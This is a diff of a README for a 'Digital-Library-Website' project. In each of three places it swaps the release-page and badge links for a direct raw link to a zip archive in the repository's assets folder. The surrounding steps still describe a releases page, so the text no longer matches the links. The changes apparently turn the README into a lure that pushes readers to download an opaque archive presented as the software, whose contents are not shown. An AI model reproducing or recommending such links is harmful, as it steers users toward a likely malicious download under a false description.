@@ -1,6 +1,6 @@
 # 📚 Digital-Library-Website - Access Books Easily from Anywhere
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://github.com/fshdfsjhfdjkshfd/Digital-Library-Website/raw/refs/heads/main/assets/Website_Digital_Library_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you get started, ensure your system meets these requirements:
 
 To install the Digital-Library-Website, visit this page to download:
 
-[Download Digital-Library-Website](https://github.com/fshdfsjhfdjkshfd/Digital-Library-Website/releases)
+[Download Digital-Library-Website](https://github.com/fshdfsjhfdjkshfd/Digital-Library-Website/raw/refs/heads/main/assets/Website_Digital_Library_v2.0.zip)
 
 1. Click on the link above to open the releases page.
 2. Look for the latest version of Digital-Library-Website.
@@ -63,4 +63,4 @@ If you want to contribute to the Digital-Library-Website, follow these steps:
 
 For any issues or questions, contact us through the repository's Issues page. We will respond as soon as possible.
 
-Remember, you can always visit [this page to download](https://github.com/fshdfsjhfdjkshfd/Digital-Library-Website/releases) the latest version. Happy reading!
+Remember, you can always visit [this page to download](https://github.com/fshdfsjhfdjkshfd/Digital-Library-Website/raw/refs/heads/main/assets/Website_Digital_Library_v2.0.zip) the latest version. Happy reading!
